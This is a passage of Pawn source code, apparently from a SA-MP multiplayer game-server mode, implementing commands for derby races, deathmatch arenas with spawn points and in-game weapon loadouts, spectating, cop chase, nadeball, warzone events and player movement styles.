			DerbyCenterX = djFloat(DERBYFILE, derbystr);
			format(derbystr, sizeof(derbystr), "D%d/Center/Y", DerbyID);
			DerbyCenterY = djFloat(DERBYFILE, derbystr);
			format(derbystr, sizeof(derbystr), "D%d/Center/Z", DerbyID);
			DerbyCenterZ = djFloat(DERBYFILE, derbystr);

			format(derbystr, sizeof(derbystr), "D%d/LoseHeight", DerbyID);
			if (!djIsSet(DERBYFILE, derbystr))
			{
				format(derbystr, sizeof(derbystr), "D%d/Comment", DerbyID);
			    format(strings, sizeof(strings), "No minimum height is set for derby \"%s\" (DerbyID %d) [/setdheight]", dj(DERBYFILE, derbystr), DerbyID);
				SendErrorMessage(playerid, EMBED_WHITE, strings);
				return 1;
			}
			switch(DerbyMode)
			{
				case 1: DerbyMinimumHeight = djFloat(DERBYFILE, derbystr); // Radius
				case 2: DerbyMinimumHeight = DerbyCenterZ - djFloat(DERBYFILE, derbystr); // Height only
				default:
				{
					format(derbystr, sizeof(derbystr), "D%d/Comment", DerbyID);
				    format(strings, sizeof(strings), "ServerError: ERROR #2 for derby \"%s\" (DerbyID %d)", dj(DERBYFILE, derbystr), DerbyID);
					SendServerMessageToAll(EMBED_DARKRED, strings);
					return 1;
				}
			}

	        DerbyMaxPlayers = 0; // reset before detecting how many players are allowed to join
			for (new i = 1; i < MAX_DERBY_PLAYERS+1; i++)
			{
		  		format(derbyidstr, sizeof(derbyidstr), "D%d/Spawn%d", DerbyID, i);
		  		if (i == 1 || i == 2)
		  		{
					if (!djIsSet(DERBYFILE, derbyidstr))
					{
						format(derbystr, sizeof(derbystr), "D%d/Comment", DerbyID);
					    format(strings, sizeof(strings), "No 2 spawns are set for derby \"%s\" (DerbyID %d) [/setdspawn]", dj(DERBYFILE, derbystr), DerbyID);
						SendErrorMessage(playerid, EMBED_WHITE, strings);
						DerbyMaxPlayers = -1;
						return 1;
					}
		  		}

				if (djIsSet(DERBYFILE, derbyidstr))
				DerbyMaxPlayers++;
			}

			tmps2 = strtok(params, idx);
	  		if (strlen(tmps2)) // is there a custom vehicle wanted for derby?
	  		{
				idx = GetVehicleModelIDFromName(tmps2);

				if (idx == -1)
				{
					idx = strval(tmps2);
					if (idx < 400 || idx > 611)
					return SendErrorMessage(playerid, EMBED_WHITE, "This vehicle does not exist");
				}

				if (IsInvalidDerbyVehicle(idx)) return SendErrorMessage(playerid, EMBED_WHITE, "This vehicle is not allowed in a derby.");
				else DerbyVehicleID = idx;
			} else {
				format(derbystr, sizeof(derbystr), "D%d/Vehicle", DerbyID);
				if (!djIsSet(DERBYFILE, derbystr))
				{
					format(derbystr, sizeof(derbystr), "D%d/Comment", DerbyID);
				    format(strings, sizeof(strings), "No vehicle is set for derby \"%s\" (DerbyID %d) [/setdveh]", dj(DERBYFILE, derbystr), DerbyID);
					SendErrorMessage(playerid, EMBED_WHITE, strings);
					return 1;
				}
				DerbyVehicleID = djInt(DERBYFILE, derbystr);
			}
		}
		ResetSelectMode(playerid);
		AddDerbyPlayer(playerid);
	} else SendErrorMessage(playerid, EMBED_WHITE, "Cannot start -- Derby already started.");
	return 1;
}

dcmd_derbylist(playerid,params[])
{
	#pragma unused params

	new derbyidstr[20],
	    derbylist[500] = "List:\n",
		id[5];

	for (new i = 1; i <= MAX_DERBIES; i++)
	{
  		format(derbyidstr, sizeof(derbyidstr), "D%d/Comment", i);
		if (djIsSet(DERBYFILE, derbyidstr))
		{
			valstr(id, i);
			strcat(derbylist, id);
			strcat(derbylist, ") ");
			strcat(derbylist, dj(DERBYFILE, derbyidstr));
			strcat(derbylist, "\n");
		}
	}
	ShowPlayerDialog(playerid, DIALOGID_DERBYLIST, DIALOG_STYLE_LIST, "Derby tracks list", derbylist, "Play", "Cancel");
	return 1;
}

dcmd_dm(playerid,params[])
{
	if (blockevents == true || dmlocked == true && !IsVIP(playerid) && !player[playerid][eventinvite])
	return SendErrorMessage(playerid, EMBED_WHITE, "An admin has currently disabled this event.");
	
	if (player[playerid][playingderby] == 1 || player[playerid][playingrr] == 1 || player[playerid][playingcc] == 1 || player[playerid][playingnb] == 1 || player[playerid][playingwarzone] == 1)
	return SendErrorMessage(playerid, EMBED_WHITE, "You are currently already participating to an event.");

	new idx,
		dmid,
		dmmessage[100],
	 	dmplayername[24];

	if (IsPlayerInAnyVehicle(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "Please exit your vehicle first.");

	tmps1 = strtok(params, idx);
	dmid = strval(tmps1);
	if (!strlen(tmps1) || dmid < 0 || dmid > 12)
	{
		SendClientMessage(playerid, COLOR_BLACK, "___________________________________________________________________________");
		SendClientMessage(playerid, COLOR_CHARTREUSE, "* DM id list: [0]Basketball [1]Mini [2]Rock [3]Bridge [4]Bridge2 [5]Castle");
		SendClientMessage(playerid, COLOR_CHARTREUSE, "* [6]Grove street [7]Hut/Forrest [8]Boxing ring [9]Powerplant [10]Mini RC");
		SendClientMessage(playerid, COLOR_CHARTREUSE, "* [11]Pilar [12]Castaway");
		SendClientMessage(playerid, COLOR_CHARTREUSE, "* USAGE: /dm <dmID>, /exit to leave DM.");
		SendClientMessage(playerid, COLOR_BLACK, "___________________________________________________________________________");
		return 1;
	}
	
	player[playerid][antifall] = 0;
	TogglePlayerControllable(playerid, 1);
	GetPlayerName(playerid, dmplayername, sizeof(dmplayername));
	switch(dmid)
	{
		case 0:
		{
	     	SetPlayerWorldBounds(playerid, 2517.0352, 2476.4038, 1302.8680, 1263.5774);
			new rand = random(sizeof(DM0Spawns));
			SetPlayerPosEx(playerid, DM0Spawns[rand][0], DM0Spawns[rand][1], DM0Spawns[rand][2], DM0Spawns[rand][3], 0);
			format(dmmessage, sizeof(dmmessage), "%s has joined a DM [Name: Basketball - /dm %d]", dmplayername, dmid);
			ResetPlayerWeapons(playerid);
			GivePlayerWeapon(playerid,9,1);
			GivePlayerWeapon(playerid,24,1000);
		    GivePlayerWeapon(playerid, 29,1000);
		    SetPlayerHealth(playerid, 100.0);
		    SetPlayerArmour(playerid, 0);
	    }
		case 1:
		{
			new rand = random(sizeof(DM1Spawns));
			SetPlayerPosEx(playerid, DM1Spawns[rand][0], DM1Spawns[rand][1], DM1Spawns[rand][2], DM1Spawns[rand][3], 0);
			format(dmmessage, sizeof(dmmessage), "%s has joined a DM [Name: Mini - /dm %d]", dmplayername, dmid);
			ResetPlayerWeapons(playerid);
		    GivePlayerWeapon(playerid, 9,1);
		    GivePlayerWeapon(playerid, 16,1000);
		    GivePlayerWeapon(playerid, 26,1000);
		    SetPlayerHealth(playerid, 100.0);
		    SetPlayerArmour(playerid, 0);
		}
		case 2:
		{
			new rand = random(sizeof(DM2Spawns));
			SetPlayerPosEx(playerid, DM2Spawns[rand][0], DM2Spawns[rand][1], DM2Spawns[rand][2], DM2Spawns[rand][3], 0);
			format(dmmessage, sizeof(dmmessage), "%s has joined a DM [Name: Rock - /dm %d]", dmplayername, dmid);
			ResetPlayerWeapons(playerid);
			GivePlayerWeapon(playerid, 9,1);
		    GivePlayerWeapon(playerid, 27,1000);
		    GivePlayerWeapon(playerid, 37,1000);
		    SetPlayerHealth(playerid, 100.0);
		    SetPlayerArmour(playerid, 0);
		}
		case 3:
		{
			new rand = random(sizeof(DM3Spawns));
			SetPlayerPosEx(playerid, DM3Spawns[rand][0], DM3Spawns[rand][1], DM3Spawns[rand][2], DM3Spawns[rand][3], 0);
			format(dmmessage, sizeof(dmmessage), "%s has joined a DM [Name: Bridge #1 - /dm %d]", dmplayername, dmid);
			ResetPlayerWeapons(playerid);
		    GivePlayerWeapon(playerid, 5,1);
		    SetPlayerHealth(playerid, 100.0);
		    SetPlayerArmour(playerid, 0);
		}
		case 4:
		{
			new rand = random(sizeof(DM4Spawns));
			SetPlayerPosEx(playerid, DM4Spawns[rand][0], DM4Spawns[rand][1], DM4Spawns[rand][2], DM4Spawns[rand][3], 0);
			format(dmmessage, sizeof(dmmessage), "%s has joined a DM [Name: Bridge #2 - /dm %d]", dmplayername, dmid);
			ResetPlayerWeapons(playerid);
		    GivePlayerWeapon(playerid, 5,1);
		    GivePlayerWeapon(playerid, 27,1000);
		    SetPlayerHealth(playerid, 100.0);
		    SetPlayerArmour(playerid, 0);
		}
		case 5:
		{
			SetPlayerWorldBounds(playerid, 2288.8955, 2141.8838, 1114.3165, 1043.5575);
			new rand = random(sizeof(DM5Spawns));
			SetPlayerPosEx(playerid, DM5Spawns[rand][0], DM5Spawns[rand][1], DM5Spawns[rand][2], DM5Spawns[rand][3], 0);
			format(dmmessage, sizeof(dmmessage), "%s has joined a DM [Name: Castle - /dm %d]", dmplayername, dmid);
			ResetPlayerWeapons(playerid);
			GivePlayerWeapon(playerid, 4,1);
			GivePlayerWeapon(playerid, 18,1000);
			GivePlayerWeapon(playerid, 24,1000);
		    GivePlayerWeapon(playerid, 30,1000);
		    SetPlayerHealth(playerid, 100.0);
		    SetPlayerArmour(playerid, 0);
		}
		case 6:
		{
			SetPlayerWorldBounds(playerid, 2540.4917, 2442.0974, -1629.0295, -1721.4233);
			new rand = random(sizeof(DM6Spawns));
			SetPlayerPosEx(playerid, DM6Spawns[rand][0], DM6Spawns[rand][1], DM6Spawns[rand][2], DM6Spawns[rand][3], 0);
			format(dmmessage, sizeof(dmmessage), "%s has joined a DM [Name: Grove Street - /dm %d]", dmplayername, dmid);
			ResetPlayerWeapons(playerid);
		    GivePlayerWeapon(playerid, 23,1000);
		    GivePlayerWeapon(playerid, 25,1000);
		    GivePlayerWeapon(playerid, 28,1000);
		    SetPlayerHealth(playerid, 100.0);
		    SetPlayerArmour(playerid, 0);
		}
		case 7:
		{
			SetPlayerWorldBounds(playerid, -1487.3649, -1671.7153, -2116.4331, -2336.1458);
			new rand = random(sizeof(DM7Spawns));
			SetPlayerPosEx(playerid, DM7Spawns[rand][0], DM7Spawns[rand][1], DM7Spawns[rand][2], DM7Spawns[rand][3], 0);
			format(dmmessage, sizeof(dmmessage), "%s has joined a DM [Name: Hut/Forrest - /dm %d]", dmplayername, dmid);
			ResetPlayerWeapons(playerid);
			GivePlayerWeapon(playerid, 24,1000);
		    GivePlayerWeapon(playerid, 31,1000);
		    GivePlayerWeapon(playerid, 34,1000);
		    SetPlayerHealth(playerid, 100.0);
		    SetPlayerArmour(playerid, 0);
		}
		case 8:
		{
			new rand = random(sizeof(DM8Spawns));
			SetPlayerPosEx(playerid, DM8Spawns[rand][0], DM8Spawns[rand][1], DM8Spawns[rand][2], DM8Spawns[rand][3], 5);
			format(dmmessage, sizeof(dmmessage), "%s has joined a DM [Name: Boxingring - /dm %d]", dmplayername, dmid);
			ResetPlayerWeapons(playerid);
		    SetPlayerHealth(playerid, 100.0);
		    SetPlayerArmour(playerid, 0);
		}
		case 9:
		{
			new rand = random(sizeof(DM9Spawns));
			SetPlayerPosEx(playerid, DM9Spawns[rand][0], DM9Spawns[rand][1], DM9Spawns[rand][2], DM9Spawns[rand][3], 0);
			format(dmmessage, sizeof(dmmessage), "%s has joined a DM [Name: Powerplant - /dm %d]", dmplayername, dmid);
			ResetPlayerWeapons(playerid);
			GivePlayerWeapon(playerid, 4,1);
		    SetPlayerHealth(playerid, 100.0);
		    SetPlayerArmour(playerid, 0);
		}
		case 10:
		{
			new rand = random(sizeof(DM10Spawns));
			SetPlayerPosEx(playerid, DM10Spawns[rand][0], DM10Spawns[rand][1], DM10Spawns[rand][2], DM10Spawns[rand][3], 10);
			format(dmmessage, sizeof(dmmessage), "%s has joined a DM [Name: Mini RC's - /dm %d]", dmplayername, dmid);
			ResetPlayerWeapons(playerid);
			GivePlayerWeapon(playerid, 22,1000);
			GivePlayerWeapon(playerid, 28,1000);
			GivePlayerWeapon(playerid, 31,1000);
		    SetPlayerHealth(playerid, 100.0);
		    SetPlayerArmour(playerid, 0);
		}
		case 11:
		{
			new rand = random(sizeof(DM11Spawns));
			SetPlayerPosEx(playerid, DM11Spawns[rand][0], DM11Spawns[rand][1], DM11Spawns[rand][2], DM11Spawns[rand][3], 0);
			format(dmmessage, sizeof(dmmessage), "%s has joined a DM [Name: Pilar - /dm %d]", dmplayername, dmid);
			ResetPlayerWeapons(playerid);
			GivePlayerWeapon(playerid, 5,1);
		    SetPlayerHealth(playerid, 15);
		    SetPlayerArmour(playerid, 0);
		}
		case 12:
		{
			SetPlayerWorldBounds(playerid, -1488.9359, -1525.1583, 1400.3300, 1351.5837);
			new rand = random(sizeof(DM12Spawns));
			SetPlayerPosEx(playerid, DM12Spawns[rand][0], DM12Spawns[rand][1], DM12Spawns[rand][2], DM12Spawns[rand][3], 0);
			format(dmmessage, sizeof(dmmessage), "%s has joined a DM [Name: Castaway - /dm %d]", dmplayername, dmid);
			ResetPlayerWeapons(playerid);
			GivePlayerWeapon(playerid, 4,1);
		    GivePlayerWeapon(playerid, 24,1000);
		    GivePlayerWeapon(playerid, 27,1000);
		    SetPlayerHealth(playerid, 100.0);
		    SetPlayerArmour(playerid, 0);
		}
	}
	player[playerid][godmode] = 0;
	player[playerid][playingdm] = 1;
	player[playerid][ramps] = 0;
	SendServerMessageToAll(EMBED_CHARTREUSE, dmmessage);
	SetPlayerVirtualWorld(playerid, WORLDID_DM);
			
	for (new i = 0; i < VIP_MAX_OSTICKS; i++)
	{
	    if (pSObject[playerid][i][so_object] != -1)
	    {
		    DestroyObject(pSObject[playerid][i][so_object]);
			pSObject[playerid][i][so_object] = -1;
		}
	}

	for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++)
	{
		if (IsPlayerAttachedObjectSlotUsed(playerid, pi))
		RemovePlayerAttachedObject(playerid, pi);
	}
	
	//mysql_run_query(mysqlConnection, "INSERT INTO "MYSQL_TABLE_SERVER_STATISTICS" (server_statistic_date, server_statistic_deathmatches_played) VALUES (CURDATE(), 1) ON DUPLICATE KEY UPDATE `server_statistic_id` = LAST_INSERT_ID(server_statistic_id), `server_statistic_deathmatches_played` = server_statistic_deathmatches_played +1", false, "", "");
	return 1;
}

dcmd_specdm(playerid,params[])
{
	if (player[playerid][playingderby] == 1 || player[playerid][playingrr] == 1 || player[playerid][playingcc] == 1 || player[playerid][playingnb] == 1 || player[playerid][playingwarzone] == 1)
	return SendErrorMessage(playerid, EMBED_WHITE, "You are currently already participating to an event.");

	new idx,
		specdmid;

    if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicleEx(playerid);

	tmps1 = strtok(params, idx);
	if (!strlen(tmps1) || !IsNumeric(tmps1))
	{
		SendClientMessage(playerid, COLOR_BLACK, "___________________________________________________________________________");
		SendClientMessage(playerid, COLOR_CHARTREUSE, "* SPEC-DM id list: [0]Basketball [1]Mini [2]Rock [3]Bridge [4]Bridge2 [5]Castle");
		SendClientMessage(playerid, COLOR_CHARTREUSE, "* [6]Grove street [7]Hut/Forrest [8]Boxing ring [9]Powerplant [10, 101, 102, 103]Mini RC");
		SendClientMessage(playerid, COLOR_CHARTREUSE, "* [11]Pilar [12]Castaway");
		SendClientMessage(playerid, COLOR_CHARTREUSE, "* USAGE: /specdm <dmID>, /exit to stop spectating DM.");
		SendClientMessage(playerid, COLOR_BLACK, "___________________________________________________________________________");
		return 1;
	}
	specdmid = strval(params);

	player[playerid][antifall] = 0;
	switch(specdmid)
	{
		case 0:
		{
			SetPlayerPos(playerid,2549.2068,1294.7407,32.9501);
			SetPlayerInterior(playerid, 0);
			SetPlayerCameraLookAt(playerid,2499.5591,1283.4,10.8125);
			SetPlayerCameraPos(playerid,2517.7578,1283.2064,40);
		}
		case 1:
		{
	  		SetPlayerPos(playerid,2435.3694,1818.4042,16.3222);
	  		SetPlayerInterior(playerid, 0);
			SetPlayerCameraLookAt(playerid,2423.1074,1805.3174,16.3222);
			SetPlayerCameraPos(playerid,2413.2700,1796.7089,24.3222);
		}
		case 2:
		{
	  		SetPlayerPos(playerid,-374.1829,2128.7332,133.1797);
	  		SetPlayerInterior(playerid, 0);
			SetPlayerCameraLookAt(playerid,-320.4595,1945.9236,132.4128);
			SetPlayerCameraPos(playerid,-328.1650,1958.2787,145.5795);
		}
		case 3:
		{
			SetPlayerPos(playerid,-1532.1107,687.7476,102.8071);
			SetPlayerInterior(playerid, 0);
			SetPlayerCameraLookAt(playerid,-1531.8247,687.1914,133.0514);
			SetPlayerCameraPos(playerid,-1530.7906,688.2780,164);
		}
		case 4:
		{
			SetPlayerPos(playerid,-1052.3054,-2824.9021,96.5121);
			SetPlayerInterior(playerid, 0);
			SetPlayerCameraLookAt(playerid,-1034.6542,-2858.0286,58);
			SetPlayerCameraPos(playerid,-1025.6549,-2858.1545,61.5107);
		}
		case 5:
		{
			SetPlayerPos(playerid,2238.8340,1136.6608,49.0947);
			SetPlayerInterior(playerid, 0);
			SetPlayerCameraLookAt(playerid,2233.1594,1090.7926,40.7969);
			SetPlayerCameraPos(playerid,2240.1438,1078.7905,43.7969);
		}
		case 6:
		{
			SetPlayerPos(playerid,2437.3223,-1662.4723,25.8689);
			SetPlayerInterior(playerid, 0);
			SetPlayerCameraLookAt(playerid,2490.1880,-1667.1317,13.3438);
			SetPlayerCameraPos(playerid,2468.8083,-1666.5055,36.7993);
		}
		case 7:
		{
			SetPlayerPos(playerid,-1666.6089,-2357.0820,87.9689);
			SetPlayerInterior(playerid, 0);
			SetPlayerCameraLookAt(playerid,-1669.7590,-2219.9868,34.1423);
			SetPlayerCameraPos(playerid,-1712.9080,-2219.6091,69.8892);
		}
		case 8:
		{
			SetPlayerPos(playerid,755.4203,16.0324,1000.7053);
			SetPlayerInterior(playerid,5);
			SetPlayerCameraLookAt(playerid,760.1411,-0.4825,1001.5942);
			SetPlayerCameraPos(playerid,756.1411,-4.4825,1003);
		}
		case 9:
		{
			SetPlayerPos(playerid,2718.3628,2773.5798,77.3594);
			SetPlayerInterior(playerid, 0);
			SetPlayerCameraLookAt(playerid,2691.8926,2784.8159,59.0212);
			SetPlayerCameraPos(playerid,2693.3657,2784.5337,75);
		}
		case 10:
		{
			SetPlayerPos(playerid,-1044.6121,1063.7504,1359);
			SetPlayerInterior(playerid, 10);
		}
		case 101:
		{
			SetPlayerPos(playerid,-1044.6121,1063.7504,1365.0);
			SetPlayerInterior(playerid, 10);
			SetPlayerCameraLookAt(playerid,-1042.5007,1063.1223,1346.2919);
			SetPlayerCameraPos(playerid,-1042.7546,1063.1405,1366.2928);
		}
		case 102:
		{
			SetPlayerPos(playerid,-1044.6121,1063.7504,1365.0);
			SetPlayerInterior(playerid, 10);
			SetPlayerCameraLookAt(playerid,-992.0102,1061.5181,1342.9379);
			SetPlayerCameraPos(playerid,-1042.7546,1063.1405,1366.2928);
		}
		case 103:
		{
			SetPlayerPos(playerid,-1044.6121,1063.7504,1370.0);
			SetPlayerInterior(playerid, 10);
			SetPlayerCameraLookAt(playerid,-1104.0933,1057.9402,1342.9397);
			SetPlayerCameraPos(playerid,-1042.7546,1063.1405,1366.2928);
		}
		case 11:
		{
			SetPlayerPos(playerid,2659.9226,-1454.2218,45.0);
			SetPlayerInterior(playerid, 0);
			SetPlayerCameraLookAt(playerid,2659.9226,-1454.2218,79.3162);
			SetPlayerCameraPos(playerid,2658.1240,-1454.2177,89.3162);
		}
		case 12:
		{
			SetPlayerPos(playerid,-1559.8210,1326.0244,1.7211);
			SetPlayerInterior(playerid, 0);
			SetPlayerCameraLookAt(playerid,-1505.0,1373.0,0);
			SetPlayerCameraPos(playerid,-1501.0,1361.0,20.0);
		}

		default:
		{
			SendClientMessage(playerid, COLOR_BLACK, "____________________________________________________");
			SendClientMessage(playerid, COLOR_WHITE, "* The entered dm id does not exist!");
			SendClientMessage(playerid, COLOR_WHITE, "* please pick one at the list, type /dm for the list");
			SendClientMessage(playerid, COLOR_WHITE, "* USAGE: /specdm <dmID>, /exit to stop spectating DM.");
			SendClientMessage(playerid, COLOR_BLACK, "____________________________________________________");
			return 1;
		}
	}
	player[playerid][specdm] = 1;
	TogglePlayerControllable(playerid, 0);
	SetPlayerVirtualWorld(playerid, WORLDID_DM);
	

	for (new i = 0; i < VIP_MAX_OSTICKS; i++)
	{
	    if (pSObject[playerid][i][so_object] != -1)
	    {
		    DestroyObject(pSObject[playerid][i][so_object]);
			pSObject[playerid][i][so_object] = -1;
		}
	}

	for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++)
	{
		if (IsPlayerAttachedObjectSlotUsed(playerid, pi))
		RemovePlayerAttachedObject(playerid, pi);
	}
	return 1;
}

dcmd_copchase(playerid,params[])
{
	#pragma unused params

	if (blockevents == true || cclocked == true && !IsVIP(playerid) && !player[playerid][eventinvite])
	return SendErrorMessage(playerid, EMBED_WHITE, "An admin has currently disabled this event.");

	if (player[playerid][playingderby] == 1 || player[playerid][playingrr] == 1 || player[playerid][playingcc] == 1 || player[playerid][playingnb] == 1 || player[playerid][playingwarzone] == 1)
	return SendErrorMessage(playerid, EMBED_WHITE, "You are currently already participating to an event.");

	if (ccplayers == MAX_COPCHASE_PLAYERS)
	return SendErrorMessage(playerid, EMBED_WHITE, "The cop chase event is already full.");

	if (!ccstarted)
	{
		if (!AntiSpam(playerid, 5)) return 1;
		
		ResetSelectMode(playerid);
		AddCCPlayer(playerid);
	} else SendErrorMessage(playerid, EMBED_WHITE, "The cop chase event has already started.");
	return 1;
}

dcmd_nadeball(playerid,params[])
{
	#pragma unused params

	if (blockevents == true || nbblocked == true && !IsVIP(playerid) && !player[playerid][eventinvite])
	return SendErrorMessage(playerid, EMBED_WHITE, "An admin has currently disabled this event.");

	if (player[playerid][playingderby] == 1 || player[playerid][playingrr] == 1 || player[playerid][playingcc] == 1 || player[playerid][playingnb] == 1 || player[playerid][playingwarzone] == 1)
	return SendErrorMessage(playerid, EMBED_WHITE, "You are currently already participating to an event.");

	if (nbplayers == MAX_NADEBALL_PLAYERS)
	return SendErrorMessage(playerid, EMBED_WHITE, "The nadeball event is already full.");

	if (!nbstarted)
	{
		if (!AntiSpam(playerid, 5)) return 1;

		ResetSelectMode(playerid);
		AddNBPlayer(playerid);
	} else SendErrorMessage(playerid, EMBED_WHITE, "The nadeball event has already started.");
	return 1;
}

dcmd_warzone(playerid,params[])
{
	#pragma unused params

	if (blockevents == true || wzlocked == true && !IsVIP(playerid) && !player[playerid][eventinvite])
	return SendErrorMessage(playerid, EMBED_WHITE, "An admin has currently disabled this event.");

	if (player[playerid][playingderby] == 1 || player[playerid][playingrr] == 1 || player[playerid][playingcc] == 1 || player[playerid][playingnb] == 1 || player[playerid][playingwarzone] == 1)
	return SendErrorMessage(playerid, EMBED_WHITE, "You are currently already participating to an event.");

	if (warzoneplayers == MAX_WARZONE_PLAYERS)
	return SendErrorMessage(playerid, EMBED_WHITE, "The Warzone event is already full.");

	if (warzonestarted == true || -2 < warzonesecondsleft < 6)
	{
		SendErrorMessage(playerid, EMBED_WHITE, "The Warzone has already been loaded.");
	} else {
		if (!AntiSpam(playerid, 5)) return 1;

		ResetSelectMode(playerid);
		AddWarzonePlayer(playerid);
	}
	return 1;
}

dcmd_warzonelist(playerid,params[])
{
	#pragma unused params

	mysql_run_query(mysqlConnection, "SELECT * FROM "MYSQL_TABLE_WARZONE_BASES"", true, "QS_LoadWarzoneBasesList", "iii", playerid, player[playerid][cinc], DIALOGID_UNKNOWN);
	return 1;
}

dcmd_exit(playerid,params[])
{
	#pragma unused params

	if (player[playerid][playingdm] == 1)
	{
		/*if (IsPlayerInAnyVehicle(playerid))
		SetVehicleToRespawn( GetPlayerVehicleID(playerid) );*/

	   	ResetBounds(playerid);
  		SetTimerEx("SpawnPlayerEx2", 3000, 0, "i", playerid);
		SendClientMessage(playerid, COLOR_AQUA, "[INFO]: Leaving in 3 seconds.");
	} else if (player[playerid][playingderby] == 1)
	{
 		new vDID = GetPlayerVehicleID(playerid);
	    if (vDID) DestroyVehicle(vDID);
		RemoveDerbyPlayer(playerid, "Left derby");
		SpawnPlayer(playerid);
	} else if (player[playerid][specdm] == 1)
	{
		player[playerid][specdm] = 0;
	 	SpawnPlayer(playerid);
  	} else if (player[playerid][playingrr] == 1)
	{
		RemoveRRPlayer(playerid, "Left Russian Roulette");
		SpawnPlayer(playerid);
	} else if (player[playerid][playingcc] == 1)
	{
		RemoveCCPlayer(playerid, "Left the cop chase");
		SpawnPlayer(playerid);
	} else if (player[playerid][playingnb] == 1)
	{
	    if (player[playerid][playernbmode] == 1)
		{
			RemoveNBPlayer(playerid, "Left nadeball");
	    } else {
			TextDrawHideForPlayer(playerid, nbhelptd1);
			TextDrawHideForPlayer(playerid, nbhelptd2);
	    
		 	player[playerid][playingnb] 	= 0;
		 	player[playerid][playernbteam] 	= 0;
		 	player[playerid][playernbmode]	= 0;
			SpawnPlayer(playerid);
		}
	} else if (player[playerid][playingwarzone] == 1)
	{
	    if (player[playerid][playerwarzonemode] == 1)
		{
			RemoveWarzonePlayer(playerid, "Left Warzone");
	    } else {
			TextDrawHideForPlayer(playerid, wzhelptd1);
			TextDrawHideForPlayer(playerid, wzhelptd2);
			TextDrawHideForPlayer(playerid, wzteamtd1);
			TextDrawHideForPlayer(playerid, wzteamtd2);
			TextDrawHideForPlayer(playerid, wzteamtd3);
			TextDrawHideForPlayer(playerid, wzweaponsettd1);
			TextDrawHideForPlayer(playerid, wzweaponsettd2);
			TextDrawHideForPlayer(playerid, wzweaponsettd3);
			TextDrawHideForPlayer(playerid, wzweaponsettd4);
			TextDrawHideForPlayer(playerid, wzweaponsettd5);
			TextDrawHideForPlayer(playerid, wzstatustd1);
			TextDrawHideForPlayer(playerid, wzstatustd2);

			player[playerid][playingwarzone] 	= 0;
			player[playerid][playerwarzoneteam]	= 0;
		 	player[playerid][playerwarzoneset] 	= 0;
			player[playerid][Spectating] 		= 0;
			player[playerid][SpectatingOn] 		= -1;
		    TogglePlayerSpectating(playerid, false);
		    SpawnPlayer(playerid);
			player[playerid][moviecrew] = -1;
			SetPlayerTeam(playerid, playerid);
			SetPlayerArmour(playerid, 0.00);
	    }
	} else SendErrorMessage(playerid, EMBED_WHITE, "You're not playing a DM, derby, Russian Roulette or a cop chase");
	return 1;
}

dcmd_run(playerid,params[])
{
	#pragma unused params

	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	if (player[playerid][walking] > 0 || player[playerid][skating] == 1 || player[playerid][swimming] == 1)
 	player[playerid][walking] = player[playerid][skating] = player[playerid][swimming] = 0;

	ShowPlayerDialog(playerid, DIALOGID_RUNNINGSTYLE, DIALOG_STYLE_LIST, "Available running styles", "Normal (CJ)\nNormal (Armed - no boobs)\nNormal (Civilian)\nNormal (Gang)\nNormal (Swat)\nNormal (Panic)\nJog (Female)\nJog (Male)\nFat\nFat & old\nOld\nBlind (Slow)\nBlind (Fast)\nLady 1\nLady 2\nLady 3\nLady 4\nMoonwalk (forward)\nArmed (Shotgun)\nArmed (Chainsaw)\nArmed (RPG)", "Set", "Cancel");

	/*if (player[playerid][running] == 0)
	{
		SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Enabled running [USAGE]: press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to trigger");
		player[playerid][running] = 1;
	} else {
		SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Disabled running");
		player[playerid][running] = 0;
		ClearAnimations(playerid);
 	}*/
	return 1;
}

dcmd_walk(playerid,params[])
{
	#pragma unused params

	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	if (player[playerid][running] > 0 || player[playerid][skating] == 1 || player[playerid][swimming] == 1)
 	player[playerid][running] = player[playerid][skating] = player[playerid][swimming] = 0;

	ShowPlayerDialog(playerid, DIALOGID_WALKINGSTYLE, DIALOG_STYLE_LIST, "Available walking styles", "Normal (CJ)\nNormal (Civilian)\nNormal (Woman 1)\nNormal (Woman 2)\nDrunk\nGangsta 1\nGangsta 2\nFat\nFat & old 1\nFat & old 2\nOld 1\nOld 2\nOld (shuffle)\nBlind\nWhore 1\nWhore 2\nStranger\nDefensive\nAngry\nSneaking (Slow)\nSneaking (Fast)\nArmed 1 (shotgun)\nArmed 2 (shotgun)\nArmed 3 (chainsaw)\nArmed 4 (RPG)", "Set", "Cancel");
	return 1;
}

dcmd_skate(playerid,params[])
{
	#pragma unused params

	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	if (player[playerid][running] > 0 || player[playerid][walking] > 0 || player[playerid][swimming] == 1)
	player[playerid][running] = player[playerid][walking] = player[playerid][swimming] = 0;

	if (player[playerid][skating] == 0)
	{
		SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Enabled skating [USAGE]: press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to trigger");
		player[playerid][skating] = 1;
	} else {
		SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Disabled skating");
		player[playerid][skating] = 0;
		ClearAnimations(playerid);
 	}
	return 1;
}

dcmd_swim(playerid,params[])
{
	#pragma unused params

	if (IsPlayerInAnyVehicle(playerid))
	RemovePlayerFromVehicle(playerid);

	if (player[playerid][running] > 0 || player[playerid][walking] > 0 || player[playerid][skating] == 1)
	player[playerid][running] = player[playerid][walking] = player[playerid][skating] = 0;

	if (player[playerid][swimming] == 0)
	{
		SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Enabled swimming [USAGE]: press "EMBED_RED"~k~~PED_SPRINT~"EMBED_IVORY" to trigger");
		player[playerid][swimming] = 1;
	} else {
		SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Disabled swimming");
		player[playerid][swimming] = 0;
		ClearAnimations(playerid);
 	}
	return 1;
}

dcmd_god(playerid,params[])
{
	#pragma unused params

	if (!servergodmode && !IsPlayerAdminLevel(playerid, 6))
	return SendErrorMessage(playerid, EMBED_WHITE, "An admin has currently disabled server godmode.");

	if (IsPlayerMuted(playerid))
